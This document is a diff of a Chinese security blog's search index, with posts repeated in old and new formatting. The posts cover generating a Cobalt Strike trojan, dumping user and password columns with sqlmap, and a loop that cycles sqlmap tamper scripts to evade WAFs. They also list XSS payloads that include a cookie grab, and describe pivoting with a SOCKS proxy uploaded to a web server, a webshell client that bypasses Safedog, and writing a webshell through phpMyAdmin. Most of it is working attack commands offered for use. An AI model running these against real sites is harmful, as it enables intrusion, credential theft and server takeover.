class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Reporting 生成报告</span><br><span class="line">Activity report    活动报告生成</span><br><span class="line">Hosts report     主机报告</span><br><span class="line">Indicators of compromise  目标报告</span><br><span class="line">Sessions report   会话报告</span><br><span class="line">Social engineering report 社会工程报告</span><br><span class="line">Reset data   重置数据</span><br><span class="line">Export data    数据出口</span><br></pre></td></tr></table></figure></p><p>功能介绍完毕。</p><h3 id="生成Windows木马"><a href="#生成Windows木马" class="headerlink" title="生成Windows木马"></a>生成Windows木马</h3><p>下面生成一Windows木马。<br>选择Cobalt Strike → listeners ，点击Add新建，Nnme随意填，ip是本机的ip，端口8899，点击Save。<br><img src="/images/6.9.png" alt=""><br>选择Attacks → Packages → Windows Executable，点击Generate生成木马。<br><img src="/images/6.10.png" alt=""><br>看到连接成功。<br><img src="/images/6.11.png" alt=""></p>]]></content>
+      
       <categories>
-        <category>Shell</category>
+          
+          <category> Shell </category>
+          
       </categories>
-      <tags>
-        <tag>远控</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[常见SQLmap使用方法]]></title>
-    <url>%2F2018%2F03%2F30%2F%E5%B8%B8%E8%A7%81SQLmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%2F</url>
-    <content type="text"><![CDATA[ASP COOKIE注入我在注射点参数上加and 1=1后，http://url/shownews.asp?id=93 and 1=1出现如下图所示的情况。很明显，有防护呀.所以该读者默认参数注射是不能成功的。像这种情况，我们可以用SQLMAP的tamper参数来绕过试一下。不过在此之前，我们还是先试一下http://url/?id=1 有没有COOKIE注射。因为很多老的软防护waf只会对GET、POST进行保护，却忽略了COOKIE。默认情况下SQLMAP只支持GET/POST参数的注入测试.现在使用cookie注入命令：1sqlmap.py -u &quot;http://url/shownews.asp&quot; --cookie &quot;id=93&quot; --level 2 --dbms &quot;Microsoft Access&quot; PHP注入(1)查找数据库 python sqlmap.py -u “http://www.xxx.com/link.php?id=321&quot; –dbs (2)通过第一步的数据库查找表(假如数据库名为dataname) python sqlmap.py -u “http://www.xxx.com/link.php?id=321&quot; -D dataname –tables (3)通过2中的表得出列名(假如表为table_name) python sqlmap.py -u “http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name –columns (4)获取字段的值(假如扫描出id,user,password字段) python sqlmap.py -u “http://www.xxx.com/link.php?id=321&quot; -D dataname -T table_name -C “user,password” –dump post登陆框注入(1)其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件我们在使用Sqlmap进行post型注入时，经常会出现请求遗漏导致注入失败的情况。这里分享一个小技巧，即结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。 浏览器打开目标地址http:// www.xxx.com /Login.asp 配置burp代理(127.0.0.1:8080)以拦截请求 点击login表单的submit按钮 这时候Burp会拦截到了我们的登录POST请求 把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下 运行sqlmap并使用如下命令：./sqlmap.py -r search-test.txt -p tfUPass这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，而-p 大家应该比较熟悉，指定注入用的参数。 注入点：http://testasp.vulnweb.com/Login.asp几种注入方式：1sqlmap.py -r search-test.txt -p tfUPass (2)自动的搜索1sqlmap -u http://testasp.vulnweb.com/Login.asp --forms (3)指定参数搜索1sqlmap -u http://testasp.vulnweb.com/Login.asp --data &quot;tfUName=321&amp;tfUPass=321&quot; 绕过WAF防火墙注入点:http://192.168.159.1/news.php?id=11sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot; space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py都是编码方式space2hash.py base64encode.py charencode.py sqlmap详细命令–is-dba 当前用户权限（是否为root权限）–dbs 所有数据库–current-db 网站当前数据库–users 所有数据库用户–current-user 当前数据库用户–random-agent 构造随机user-agent–passwords 数据库密码–proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）相关连接地址:https://mrxn.net/Infiltration/sqlmap-teaches-share-all.html]]></content>
+      
+      
+        <tags>
+            
+            <tag> 远控 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>常见SQLmap使用方法</title>
+      <link href="/2018/03/30/%E5%B8%B8%E8%A7%81SQLmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
+      <url>/2018/03/30/%E5%B8%B8%E8%A7%81SQLmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
+      <content type="html"><![CDATA[<h3 id="ASP-COOKIE注入"><a href="#ASP-COOKIE注入" class="headerlink" title="ASP COOKIE注入"></a>ASP COOKIE注入</h3><p>我在注射点参数上加and 1=1后，<a href="http://url/shownews.asp?id=93" target="_blank" rel="noopener">http://url/shownews.asp?id=93</a> and 1=1出现如下图所示的情况。<br><a id="more"></a><br><img src="/images/5.1.png" alt=""><br><img src="/images/5.2.png" alt="" title="默认注入失败"><br>很明显，有防护呀.所以该读者默认参数注射是不能成功的。像这种情况，我们可以用SQLMAP的tamper参数来绕过试一下。不过在此之前，我们还是先试一下<a href="http://url/?id=1" target="_blank" rel="noopener">http://url/?id=1</a> 有没有COOKIE注射。因为很多老的软防护waf只会对GET、POST进行保护，却忽略了COOKIE。<br>默认情况下SQLMAP只支持GET/POST参数的注入测试.现在使用cookie注入命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://url/shownews.asp&quot; --cookie &quot;id=93&quot; --level 2 --dbms &quot;Microsoft Access&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/images/5.3.png" alt="" title="cookie注入成功"></p><h3 id="PHP注入"><a href="#PHP注入" class="headerlink" title="PHP注入"></a>PHP注入</h3><p>(1)查找数据库</p><blockquote><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> –dbs</p></blockquote><p>(2)通过第一步的数据库查找表(假如数据库名为dataname)</p><blockquote><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> -D dataname –tables</p></blockquote><p>(3)通过2中的表得出列名(假如表为table_name)</p><blockquote><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> -D dataname -T table_name –columns</p></blockquote><p>(4)获取字段的值(假如扫描出id,user,password字段)</p><blockquote><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> -D dataname -T table_name -C “user,password” –dump</p></blockquote><h3 id="post登陆框注入"><a href="#post登陆框注入" class="headerlink" title="post登陆框注入"></a>post登陆框注入</h3><p>(1)其中的search-test.txt是通过抓包工具burp suite抓到的包并把数据保存为这个txt文件<br>我们在使用Sqlmap进行post型注入时，<br>经常会出现请求遗漏导致注入失败的情况。<br>这里分享一个小技巧，即结合burpsuite来使用sqlmap，<br>用这种方法进行post注入测试会更准确，操作起来也非常容易。</p><ol><li>浏览器打开目标地址http:// <a href="http://www.xxx.com" target="_blank" rel="noopener">www.xxx.com</a> /Login.asp</li><li>配置burp代理(127.0.0.1:8080)以拦截请求</li><li>点击login表单的submit按钮</li><li>这时候Burp会拦截到了我们的登录POST请求</li><li>把这个post请求复制为txt, 我这命名为search-test.txt 然后把它放至sqlmap目录下</li><li>运行sqlmap并使用如下命令：<br>./sqlmap.py -r search-test.txt -p tfUPass<br>这里参数-r 是让sqlmap加载我们的post请求rsearch-test.txt，<br>而-p 大家应该比较熟悉，指定注入用的参数。</li></ol><p>注入点：<a href="http://testasp.vulnweb.com/Login.asp" target="_blank" rel="noopener">http://testasp.vulnweb.com/Login.asp</a><br>几种注入方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r search-test.txt -p tfUPass</span><br></pre></td></tr></table></figure></p><p>(2)自动的搜索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://testasp.vulnweb.com/Login.asp --forms</span><br></pre></td></tr></table></figure></p><p>(3)指定参数搜索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://testasp.vulnweb.com/Login.asp --data &quot;tfUName=321&amp;tfUPass=321&quot;</span><br></pre></td></tr></table></figure></p><h3 id="绕过WAF防火墙"><a href="#绕过WAF防火墙" class="headerlink" title="绕过WAF防火墙"></a>绕过WAF防火墙</h3><p>注入点:<a href="http://192.168.159.1/news.php?id=1" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.159.1/news.php?id=1 -v 3 --dbs --batch --tamper &quot;space2morehash.py&quot;</span><br></pre></td></tr></table></figure></p><p>space2morehash.py中可以替换space2hash.py或者base64encode.py或者charencode.py<br>都是编码方式<br>space2hash.py base64encode.py charencode.py</p><h3 id="sqlmap详细命令"><a href="#sqlmap详细命令" class="headerlink" title="sqlmap详细命令"></a>sqlmap详细命令</h3><p>–is-dba 当前用户权限（是否为root权限）<br>–dbs 所有数据库<br>–current-db 网站当前数据库<br>–users 所有数据库用户<br>–current-user 当前数据库用户<br>–random-agent 构造随机user-agent<br>–passwords 数据库密码<br>–proxy <a href="http://local:8080" target="_blank" rel="noopener">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理<br>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）<br><em>相关连接地址:<a href="https://mrxn.net/Infiltration/sqlmap-teaches-share-all.html" target="_blank" rel="noopener">https://mrxn.net/Infiltration/sqlmap-teaches-share-all.html</a></em></p>]]></content>
+      
       <categories>
-        <category>sqlmap</category>
+          
+          <category> sqlmap </category>
+          
       </categories>
-      <tags>
-        <tag>sqlmap</tag>
-        <tag>WAF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[用sqlmap粗暴地绕过waf]]></title>
-    <url>%2F2018%2F03%2F21%2F%E7%94%A8sqlmap%E7%B2%97%E6%9A%B4%E5%9C%B0%E7%BB%95%E8%BF%87waf%2F</url>
-    <content type="text"><![CDATA[许多情况下我们可以通过使用sqlmap中的tamper脚本来对目标进行更高效的攻击。tamper脚本的作用是修改我们发出的请求来防止其被WAF(网络应用防火墙)拦截。在某些情况你可能需要把一些脚本合并到一起才能过WAF。脚本的完整列表地址在sqlmap amper。使用方法是加参数–tamper name.py或–tamper name1.py,name2.py,name3.py……但是有那么多tamper该如何快速找出适合的？一个一个来试是否是太累太费劲，而且对有些小白来讲很难记住每个tamper脚本具体是做什么用的。土司的lostwolf写了一个sh命令，可以在kali下直接依次使用每个tamper脚本，从而找到合适的。该sh语句是：1for t in `ls /usr/share/sqlmap/tamper/*.py`; do echo -e &quot;e[41;1m tamper: $te[0m&quot;; sqlmap -u &quot;http://192.168.1.100/sql.asp?id=1&quot; --dbs --random-agent --smart --batch --tamper $t --threads 10;done; 说明下 –random-agent参数随机；random-agent 随机agent头 ；–smart 智能机的方式；–batch 默认选择接收输入；echo -e “e[41;1m tamper: $te[0m”; 是为了红底白字显示当前使用的tamper脚本。如果在windows下怎么办，我写了一个批处理，命令如下（sqlmap路径位置自行更改）：1for /f &quot;delims=&quot; %%i in (&apos;dir /b D:sqlmap amper*.py&apos;) do d:sqlmapsqlmap.py -u &quot;http://192.168.1.100/sql.asp?id=1&quot; --dbs --random-agent --smart --batch --tamper %%i --threads 10 当然这个方法也是有缺陷的，会非常粗暴地调用每个tamper脚本来试一次，并且不会组合脚本来测试了，所以大家如果能了解每个tamper脚本作用，精准的调用，会省力省时很多。原文地址:https://www.toutiao.com/i6527560237581337091/]]></content>
+      
+      
+        <tags>
+            
+            <tag> sqlmap </tag>
+            
+            <tag> WAF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>用sqlmap粗暴地绕过waf</title>
+      <link href="/2018/03/21/%E7%94%A8sqlmap%E7%B2%97%E6%9A%B4%E5%9C%B0%E7%BB%95%E8%BF%87waf/"/>
+      <url>/2018/03/21/%E7%94%A8sqlmap%E7%B2%97%E6%9A%B4%E5%9C%B0%E7%BB%95%E8%BF%87waf/</url>
+      <content type="html"><![CDATA[<p>许多情况下我们可以通过使用sqlmap中的tamper脚本来对目标进行更高效的攻击。<a id="more"></a>tamper脚本的作用是修改我们发出的请求来防止其被WAF(网络应用防火墙)拦截。在某些情况你可能需要把一些脚本合并到一起才能过WAF。脚本的完整列表地址在sqlmap    amper。使用方法是加参数–tamper name.py或–tamper name1.py,name2.py,name3.py……<br><img src="/images/4.1.jpg" alt="" title="linux下tamper脚本位置"><br><img src="/images/4.2.jpg" alt="" title="win下tamper脚本位置"><br>但是有那么多tamper该如何快速找出适合的？一个一个来试是否是太累太费劲，而且对有些小白来讲很难记住每个tamper脚本具体是做什么用的。土司的lostwolf写了一个sh命令，可以在kali下直接依次使用每个tamper脚本，从而找到合适的。该sh语句是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for t in `ls /usr/share/sqlmap/tamper/*.py`; do echo -e &quot;e[41;1m tamper: $te[0m&quot;; sqlmap -u &quot;http://192.168.1.100/sql.asp?id=1&quot; --dbs --random-agent --smart --batch --tamper $t --threads 10;done;</span><br></pre></td></tr></table></figure></p><p><img src="/images/4.3.jpg" alt=""><br>说明下 –random-agent参数随机；random-agent 随机agent头 ；–smart 智能机的方式；–batch 默认选择接收输入；echo -e “e[41;1m tamper: $te[0m”; 是为了红底白字显示当前使用的tamper脚本。<br>如果在windows下怎么办，我写了一个批处理，命令如下（sqlmap路径位置自行更改）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;delims=&quot; %%i in (&apos;dir /b D:sqlmapamper*.py&apos;) do d:sqlmapsqlmap.py -u &quot;http://192.168.1.100/sql.asp?id=1&quot; --dbs --random-agent --smart --batch --tamper %%i --threads 10</span><br></pre></td></tr></table></figure></p><p><img src="/images/4.4.jpg" alt=""><br>当然这个方法也是有缺陷的，会非常粗暴地调用每个tamper脚本来试一次，并且不会组合脚本来测试了，所以大家如果能了解每个tamper脚本作用，精准的调用，会省力省时很多。<br>原文地址:<a href="https://www.toutiao.com/i6527560237581337091/" target="_blank" rel="noopener">https://www.toutiao.com/i6527560237581337091/</a></p>]]></content>
+      
       <categories>
-        <category>sqlmap</category>
+          
+          <category> sqlmap </category>
+          
       </categories>
-      <tags>
-        <tag>sqlmap</tag>
-        <tag>WAF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[网站的渗透测试思路]]></title>
-    <url>%2F2018%2F03%2F10%2F%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF%2F</url>
-    <content type="text"><![CDATA[信息收集1、服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）2、网站指纹识别（包括，cms，cdn，证书等），dns记录3、whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）4、子域名收集，旁站查询(有授权可渗透)，C段等5、google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等6、扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等7、传输协议，通用漏洞，exp，github源码等 漏洞挖掘1、浏览网站，看看网站规模，功能，特点等2、端口，弱口令，目录等扫描3、XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等 漏洞利用 | 权限提升SQL注入，XSS，CSRF等SQL注入原理1、SQL（结构化语句查询）2、提交参数（调用数据库查询）的地方是用户可控的，并未做任何过滤处理3、分 数字型，字符型，搜索型，POST注入，Cookie注入，延时注入，盲注等SQL注入，注入方法1、如果是get型号，直接，sqlmap-u “注入点URL”2、如果是post型诸如点，可以sqlmap-u “注入点URL” –data=”post的参数”3、如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用 * 号替换，放到文件里，然后sqlmap -r “文件地址”XSS原理网站未对用户输入的数据做过滤处理，构造特定的JS脚本插入到文本框可引发XSS，会被浏览器解析，执行XSS常见攻击语句12345"&gt;&lt;BODY&gt;&lt;""&gt;&lt;svg /onload=prompt(1)&gt;&lt;""&gt;&lt;IMG SRC="javascript:alert('XSS');"&gt;&lt;""&gt;&lt;img src=" "=" "onerror="alert('xss')"&gt;&lt;""&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;" mysql提权，serv-u提权，linux内核版本提权等清除测试数据 | 输出报告1、日志、测试数据的清理2、总结，输出渗透测试报告，附修复方案 复测1、验证并发现是否有新漏洞，输出报告，归档 网络安全事件应急响应1、取证，登录服务器，备份，检查服务器敏感目录，查毒（搜索后门文件 - 注意文件的时间，用户，后缀等属性），调取日志（系统日志，中间件日志，WAF日 志等）；2、处理，恢复备份（快照回滚，最近一次），确定入侵方法（漏洞检测，并进行修复）3、溯源，查入侵IP，入侵手法（网路攻击事件）的确定等4、记录，归档—-预防-事件检测-抑制-根除-恢复-跟踪-记录]]></content>
+      
+      
+        <tags>
+            
+            <tag> sqlmap </tag>
+            
+            <tag> WAF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>网站的渗透测试思路</title>
+      <link href="/2018/03/10/%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/"/>
+      <url>/2018/03/10/%E7%BD%91%E7%AB%99%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/</url>
+      <content type="html"><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>1、服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）<br>2、网站指纹识别（包括，cms，cdn，证书等），dns记录<br>3、whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）<br>4、子域名收集，旁站查询(有授权可渗透)，C段等<br><a id="more"></a><br>5、google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等<br>6、扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等<br>7、传输协议，通用漏洞，exp，github源码等</p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>1、浏览网站，看看网站规模，功能，特点等<br>2、端口，弱口令，目录等扫描<br>3、XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</p><h3 id="漏洞利用-权限提升"><a href="#漏洞利用-权限提升" class="headerlink" title="漏洞利用 | 权限提升"></a>漏洞利用 | 权限提升</h3><h4 id="SQL注入，XSS，CSRF等"><a href="#SQL注入，XSS，CSRF等" class="headerlink" title="SQL注入，XSS，CSRF等"></a>SQL注入，XSS，CSRF等</h4><p><strong>SQL注入原理</strong><br>1、SQL（结构化语句查询）<br>2、提交参数（调用数据库查询）的地方是用户可控的，并未做任何过滤处理<br>3、分 数字型，字符型，搜索型，POST注入，Cookie注入，延时注入，盲注等<br><strong>SQL注入，注入方法</strong><br>1、如果是get型号，直接，sqlmap-u “注入点URL”<br>2、如果是post型诸如点，可以sqlmap-u “注入点URL” –data=”post的参数”<br>3、如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用 * 号替换，放到文件里，然后sqlmap -r “文件地址”<br><strong>XSS原理</strong><br>网站未对用户输入的数据做过滤处理，构造特定的JS脚本插入到文本框可引发XSS，会被浏览器解析，执行<br><strong>XSS常见攻击语句</strong><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">BODY</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br><span class="line"><span class="tag">"&gt;</span><span class="tag">&lt;<span class="name">svg</span> /<span class="attr">onload</span>=<span class="string">prompt(1)</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br><span class="line"><span class="tag">"&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">"javascript:alert('XSS');"</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br><span class="line"><span class="tag">"&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">" "</span>=<span class="string">" "</span><span class="attr">onerror</span>=<span class="string">"alert('xss')"</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br><span class="line"><span class="tag">"&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(document.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">"</span></span></span><br></pre></td></tr></table></figure></p><h4 id="mysql提权，serv-u提权，linux内核版本提权等"><a href="#mysql提权，serv-u提权，linux内核版本提权等" class="headerlink" title="mysql提权，serv-u提权，linux内核版本提权等"></a>mysql提权，serv-u提权，linux内核版本提权等</h4><h3 id="清除测试数据-输出报告"><a href="#清除测试数据-输出报告" class="headerlink" title="清除测试数据 | 输出报告"></a>清除测试数据 | 输出报告</h3><p>1、日志、测试数据的清理<br>2、总结，输出渗透测试报告，附修复方案</p><h3 id="复测"><a href="#复测" class="headerlink" title="复测"></a>复测</h3><p>1、验证并发现是否有新漏洞，输出报告，归档</p><h3 id="网络安全事件应急响应"><a href="#网络安全事件应急响应" class="headerlink" title="网络安全事件应急响应"></a>网络安全事件应急响应</h3><p>1、取证，登录服务器，备份，检查服务器敏感目录，查毒（搜索后门文件 - 注意文件的时间，用户，后缀等属性），调取日志（系统日志，中间件日志，WAF日 志等）；<br>2、处理，恢复备份（快照回滚，最近一次），确定入侵方法（漏洞检测，并进行修复）<br>3、溯源，查入侵IP，入侵手法（网路攻击事件）的确定等<br>4、记录，归档—-预防-事件检测-抑制-根除-恢复-跟踪-记录</p>]]></content>
+      
       <categories>
-        <category>Webshell</category>
+          
+          <category> Webshell </category>
+          
       </categories>
-      <tags>
-        <tag>Webshell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[网络代理工具]]></title>
-    <url>%2F2018%2F03%2F09%2F%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%2F</url>
-    <content type="text"><![CDATA[windows、linux代理Earthworm是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。下载地址：http://rootkiter.com/EarthWorm/使用Proxifier配合简单完成。Proxifier使用教程：https://jingyan.baidu.com/article/48b558e35e12f97f38c09a28.html现在可以上Google了。 socks5代理这个代理更好用，需要Python执行环境。上传Python脚本到服务器。s5.py下载地址：https://github.com/alone5xiao/hamal.cc执行命令：1Python /var/www/html/s5.py 8082 使用Proxifier代理成功。]]></content>
+      
+      
+        <tags>
+            
+            <tag> Webshell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>网络代理工具</title>
+      <link href="/2018/03/09/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/"/>
+      <url>/2018/03/09/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/</url>
+      <content type="html"><![CDATA[<h3 id="windows、linux代理"><a href="#windows、linux代理" class="headerlink" title="windows、linux代理"></a>windows、linux代理</h3><p>Earthworm是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。下载地址：<a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">http://rootkiter.com/EarthWorm/</a><br><a id="more"></a><br>使用Proxifier配合简单完成。Proxifier使用教程：<a href="https://jingyan.baidu.com/article/48b558e35e12f97f38c09a28.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/48b558e35e12f97f38c09a28.html</a><br>现在可以上Google了。<br><img src="/images/3、1.png" alt="" title="IP地址"></p><h3 id="socks5代理"><a href="#socks5代理" class="headerlink" title="socks5代理"></a>socks5代理</h3><p>这个代理更好用，需要Python执行环境。上传Python脚本到服务器。s5.py下载地址：<a href="https://github.com/alone5xiao/hamal.cc" target="_blank" rel="noopener">https://github.com/alone5xiao/hamal.cc</a><br>执行命令：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python /var/www/html/s5.py <span class="number">8082</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/3、2.png" alt=""><br>使用Proxifier代理成功。<br><img src="/images/3、4.png" alt=""><br><img src="/images/3、3.png" alt=""></p>]]></content>
+      
       <categories>
-        <category>网络代理</category>
+          
+          <category> 网络代理 </category>
+          
       </categories>
-      <tags>
-        <tag>网络代理</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[网页过狗一句话客户端]]></title>
-    <url>%2F2018%2F02%2F28%2F%E7%BD%91%E9%A1%B5%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%AE%A2%E6%88%B7%E7%AB%AF%2F</url>
-    <content type="text"><![CDATA[在很多网站都有安全狗，用菜刀连接总是失败。。用网页一句话客户端绕过安全狗拦截。下载地址：https://github.com/alone5xiao/hamal.cc]]></content>
+      
+      
+        <tags>
+            
+            <tag> 网络代理 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>网页过狗一句话客户端</title>
+      <link href="/2018/02/28/%E7%BD%91%E9%A1%B5%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%AE%A2%E6%88%B7%E7%AB%AF/"/>
+      <url>/2018/02/28/%E7%BD%91%E9%A1%B5%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%AE%A2%E6%88%B7%E7%AB%AF/</url>
+      <content type="html"><![CDATA[<p>在很多网站都有安全狗，用菜刀连接总是失败。。<br><a id="more"></a><br><img src="/images/2、1.png" alt=""><br>用网页一句话客户端绕过安全狗拦截。下载地址：<a href="https://github.com/alone5xiao/hamal.cc" target="_blank" rel="noopener">https://github.com/alone5xiao/hamal.cc</a><br><img src="/images/2、2.png" alt=""></p>]]></content>
+      
       <categories>
-        <category>一句话木马</category>
+          
+          <category> 一句话木马 </category>
+          
       </categories>
-      <tags>
-        <tag>一句话木马</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[拿Webshell小技巧]]></title>
-    <url>%2F2018%2F02%2F24%2F%E6%8B%BFWebshell%E5%B0%8F%E6%8A%80%E5%B7%A7%2F</url>
-    <content type="text"><![CDATA[用sqlmap注入拿到root账号密码，想用phpmyadmin写入一句话拿shell的时候，没有绝对路径。。就没有办法写入sehll。用工具扫描子域名，尝试用子网站拿shell，结果扫出来，还找到phpmyadmin，用爆出来的账号密码登录，登录成功。。用google搜索一波,拿到绝对路径现在有绝对路径，可以写入shell了。还是system权限，不错不错。。。]]></content>
+      
+      
+        <tags>
+            
+            <tag> 一句话木马 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>拿Webshell小技巧</title>
+      <link href="/2018/02/24/%E6%8B%BFWebshell%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
+      <url>/2018/02/24/%E6%8B%BFWebshell%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
+      <content type="html"><![CDATA[<p>用sqlmap注入拿到root账号密码，想用phpmyadmin写入一句话拿shell的时候，没有绝对路径。。就没有办法写入sehll。<br><a id="more"></a><br><img src="/images/1、1.png" alt=""><br>用工具扫描子域名，尝试用子网站拿shell，结果扫出来，还找到phpmyadmin，用爆出来的账号密码登录，登录成功。。<br><img src="/images/1、2.png" alt=""><br>用google搜索一波,拿到绝对路径<br><img src="/images/1、3.png" alt=""><br>现在有绝对路径，可以写入shell了。<br><img src="/images/1、4.png" alt=""><br>还是system权限，不错不错。。。<br><img src="/images/1、5.png" alt=""></p>]]></content>
+      
       <categories>
-        <category>Webshell</category>
+          
+          <category> Webshell </category>
+          
       </categories>
-      <tags>
-        <tag>Webshell</tag>
-      </tags>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> Webshell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+  
+  
 </search>
